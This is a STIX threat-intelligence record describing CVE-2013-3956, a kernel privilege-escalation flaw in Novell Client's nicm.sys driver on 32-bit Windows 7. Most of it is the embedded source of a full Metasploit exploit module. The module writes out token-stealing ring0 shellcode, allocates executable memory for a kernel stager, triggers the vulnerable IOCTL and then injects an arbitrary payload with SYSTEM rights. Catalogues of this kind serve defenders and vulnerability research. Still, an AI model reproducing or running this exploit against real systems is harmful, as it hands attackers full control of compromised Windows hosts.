{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--24f355bc-59a9-4891-87f0-de741cabf880",
    "created": "2024-08-14T16:50:09.308828Z",
    "modified": "2024-08-14T16:50:09.308832Z",
    "name": "Novell Client 2 SP3 nicm.sys Local Privilege Escalation",
    "description": " This module exploits a flaw in the nicm.sys driver to execute arbitrary code in kernel space. The vulnerability occurs while handling ioctl requests with code 0x143B6B, where a user provided pointer is used as function pointer. The module has been tested successfully on Windows 7 SP1 with Novell Client 2 SP3.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/novell_client_nicm.rb",
            "external_id": "novell_client_nicm.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-3956"
        },
        {
            "source_name": "reference",
            "url": "http://www.novell.com/support/kb/doc.php?id=7012497"
        },
        {
            "source_name": "reference",
            "url": "http://pastebin.com/GB4iiEwR"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = AverageRanking\n\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Process\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        {\n          'Name' => 'Novell Client 2 SP3 nicm.sys Local Privilege Escalation',\n          'Description' => %q{\n            This module exploits a flaw in the nicm.sys driver to execute arbitrary code in\n            kernel space. The vulnerability occurs while handling ioctl requests with code\n            0x143B6B, where a user provided pointer is used as function pointer. The module\n            has been tested successfully on Windows 7 SP1 with Novell Client 2 SP3.\n          },\n          'License' => MSF_LICENSE,\n          'Author' => [\n            'Unknown', # Vulnerability discovery\n            'juan vazquez' # MSF module\n          ],\n          'Arch' => ARCH_X86,\n          'Platform' => 'win',\n          'SessionTypes' => [ 'meterpreter' ],\n          'DefaultOptions' => {\n            'EXITFUNC' => 'thread'\n          },\n          'Targets' => [\n            # Tested with nicm.sys Version v3.1.5 Novell XTier Novell XTCOM Services Driver for Windows\n            # as installed with Novell Client 2 SP3 for Windows 7\n            [ 'Automatic', {} ],\n            [\n              'Windows 7 SP1',\n              {\n                'HaliQuerySystemInfo' => 0x16bba, # Stable over Windows XP SP3 updates\n                '_KPROCESS' => \"\\x50\", # Offset to _KPROCESS from a _ETHREAD struct\n                '_TOKEN' => \"\\xf8\", # Offset to TOKEN from the _EPROCESS struct\n                '_UPID' => \"\\xb4\", # Offset to UniqueProcessId FROM the _EPROCESS struct\n                '_APLINKS' => \"\\xb8\" # Offset to ActiveProcessLinks _EPROCESS struct\n              }\n            ]\n          ],\n          'Payload' => {\n            'Space' => 4096,\n            'DisableNops' => true\n          },\n          'References' => [\n            [ 'CVE', '2013-3956' ],\n            [ 'OSVDB', '93718' ],\n            [ 'URL', 'http://www.novell.com/support/kb/doc.php?id=7012497' ],\n            [ 'URL', 'http://pastebin.com/GB4iiEwR' ]\n          ],\n          'DisclosureDate' => '2013-05-22',\n          'DefaultTarget' => 0,\n          'Compat' => {\n            'Meterpreter' => {\n              'Commands' => %w[\n                stdapi_railgun_api\n                stdapi_sys_process_attach\n                stdapi_sys_process_memory_write\n              ]\n            }\n          }\n        }\n      )\n    )\n  end\n\n  def open_device(dev)\n    invalid_handle_value = 0xFFFFFFFF\n\n    r = session.railgun.kernel32.CreateFileA(dev, 'GENERIC_READ', 0x3, nil, 'OPEN_EXISTING', 'FILE_ATTRIBUTE_READONLY', 0)\n\n    handle = r['return']\n\n    if handle == invalid_handle_value\n      return nil\n    end\n\n    return handle\n  end\n\n  def ring0_shellcode(t)\n    tokenstealing = \"\\x52\" # push edx                         # Save edx on the stack\n    tokenstealing << \"\\x53\"                                                   # push ebx                         # Save ebx on the stack\n    tokenstealing << \"\\x33\\xc0\"                                               # xor eax, eax                     # eax = 0\n    tokenstealing << \"\\x64\\x8b\\x80\\x24\\x01\\x00\\x00\"                           # mov eax, dword ptr fs:[eax+124h] # Retrieve ETHREAD\n    tokenstealing << \"\\x8b\\x40\" + t['_KPROCESS']                              # mov eax, dword ptr [eax+50h]     # Retrieve _KPROCESS\n    tokenstealing << \"\\x8b\\xc8\"                                               # mov ecx, eax\n    tokenstealing << \"\\x8b\\x98\" + t['_TOKEN'] + \"\\x00\\x00\\x00\"                # mov ebx, dword ptr [eax+0f8h]    # Retrieves TOKEN\n    tokenstealing << \"\\x8b\\x80\" + t['_APLINKS'] + \"\\x00\\x00\\x00\"              # mov eax, dword ptr [eax+b8h]  <====| # Retrieve FLINK from ActiveProcessLinks\n    tokenstealing << \"\\x81\\xe8\" + t['_APLINKS'] + \"\\x00\\x00\\x00\"              # sub eax,b8h                        | # Retrieve _EPROCESS Pointer from the ActiveProcessLinks\n    tokenstealing << \"\\x81\\xb8\" + t['_UPID'] + \"\\x00\\x00\\x00\\x04\\x00\\x00\\x00\" # cmp dword ptr [eax+b4h], 4         | # Compares UniqueProcessId with 4 (The System Process on Windows XP)\n    tokenstealing << \"\\x75\\xe8\"                                               # jne 0000101e ======================\n    tokenstealing << \"\\x8b\\x90\" + t['_TOKEN'] + \"\\x00\\x00\\x00\"                # mov edx,dword ptr [eax+0f8h]     # Retrieves TOKEN and stores on EDX\n    tokenstealing << \"\\x8b\\xc1\"                                               # mov eax, ecx                     # Retrieves KPROCESS stored on ECX\n    tokenstealing << \"\\x89\\x90\" + t['_TOKEN'] + \"\\x00\\x00\\x00\"                # mov dword ptr [eax+0f8h],edx     # Overwrites the TOKEN for the current KPROCESS\n    tokenstealing << \"\\x5b\"                                                   # pop ebx                          # Restores ebx\n    tokenstealing << \"\\x5a\"                                                   # pop edx                          # Restores edx\n    tokenstealing << \"\\xc2\\x08\"                                               # ret 08h                          # Away from the kernel!\n\n    return tokenstealing\n  end\n\n  def allocate_memory(proc, address, length)\n    result = session.railgun.ntdll.NtAllocateVirtualMemory(-1, [ address ].pack('V'), nil, [ length ].pack('V'), 'MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN', 'PAGE_EXECUTE_READWRITE')\n\n    if !(result['BaseAddress']) || result['BaseAddress'].empty?\n      vprint_error('Failed to allocate memory')\n      return nil\n    end\n\n    my_address = result['BaseAddress'].unpack('V')[0]\n\n    vprint_good(\"Memory allocated at 0x#{my_address.to_s(16)}\")\n\n    if !proc.memory.writable?(my_address)\n      vprint_error('Failed to allocate memory')\n      return nil\n    else\n      vprint_good(\"0x#{my_address.to_s(16)} is now writable\")\n    end\n\n    return my_address\n  end\n\n  def junk(n = 4)\n    return rand_text_alpha(n).unpack('V').first\n  end\n\n  def check\n    handle = open_device('\\\\\\\\.\\\\nicm')\n    if handle.nil?\n      return Exploit::CheckCode::Safe\n    end\n\n    session.railgun.kernel32.CloseHandle(handle)\n    return Exploit::CheckCode::Detected\n  end\n\n  def exploit\n    if sysinfo['Architecture'] == ARCH_X64\n      fail_with(Failure::NoTarget, 'Running against 64-bit systems is not supported')\n    end\n\n    my_target = nil\n    if target.name =~ /Automatic/\n      print_status('Detecting the target system...')\n      version = get_version_info\n      if version.build_number.between?(Msf::WindowsVersion::Win7_SP0, Msf::WindowsVersion::Win7_SP1) && !version.windows_server?\n        my_target = targets[1]\n        print_status(\"Running against #{my_target.name}\")\n      end\n    else\n      my_target = target\n    end\n\n    if my_target.nil?\n      fail_with(Failure::NoTarget, 'Remote system not detected as target, select the target manually')\n    end\n\n    print_status('Checking device...')\n    handle = open_device('\\\\\\\\.\\\\nicm')\n    if handle.nil?\n      fail_with(Failure::NoTarget, '\\\\\\\\.\\\\nicm device not found')\n    else\n      print_good('\\\\\\\\.\\\\nicm found!')\n    end\n\n    this_proc = session.sys.process.open\n\n    print_status('Storing the Kernel stager on memory...')\n    stager_address = 0x0d0d0000\n    stager_address = allocate_memory(this_proc, stager_address, 0x1000)\n\n    if stager_address.nil? || (stager_address == 0)\n      session.railgun.kernel32.CloseHandle(handle)\n      fail_with(Failure::Unknown, 'Failed to allocate memory')\n    end\n\n    # eax => &kernel_stager\n    # .text:000121A3 mov     ecx, eax\n    # .text:000121A5 mov     eax, [ecx]\n    # .text:000121A7 mov     edx, [eax]\n    # .text:000121A9 push    ecx\n    # .text:000121AA push    eax\n    # .text:000121AB call    dword ptr [edx+0Ch]\n    kernel_stager = [\n      stager_address + 0x14, # stager_address\n      junk,\n      junk,\n      junk,\n      junk,\n      stager_address + 0x18, # stager_address + 0x14\n      junk,\n      junk,\n      junk,\n      stager_address + 0x28  # stager_address + 0x24\n    ].pack('V*')\n\n    kernel_stager << ring0_shellcode(my_target)\n\n    result = this_proc.memory.write(stager_address, kernel_stager)\n\n    if result.nil?\n      session.railgun.kernel32.CloseHandle(handle)\n      fail_with(Failure::Unknown, 'Failed to write contents to memory')\n    else\n      vprint_good(\"Contents successfully written to 0x#{stager_address.to_s(16)}\")\n    end\n\n    print_status('Triggering the vulnerability to execute the Kernel Handler')\n    magic_ioctl = 0x143B6B # Vulnerable IOCTL\n    ioctl = session.railgun.ntdll.NtDeviceIoControlFile(handle, 0, 0, 0, 4, magic_ioctl, stager_address, 0x14, 0, 0)\n    session.railgun.kernel32.CloseHandle(handle)\n\n    if ioctl['GetLastError'] != 0\n      print_error('Something wrong while triggering the vulnerability, anyway checking privileges...')\n    end\n\n    print_status('Checking privileges after exploitation...')\n\n    if !is_system?\n      fail_with(Failure::Unknown, \"The exploitation wasn't successful\")\n    else\n      print_good('Exploitation successful!')\n    end\n\n    p = payload.encoded\n    print_status(\"Injecting #{p.length} bytes to memory and executing it...\")\n    if execute_shellcode(p)\n      print_good('Enjoy')\n    else\n      fail_with(Failure::Unknown, 'Error while executing the payload')\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-05-22",
    "x_mitre_platforms": [
        "win'"
    ]
}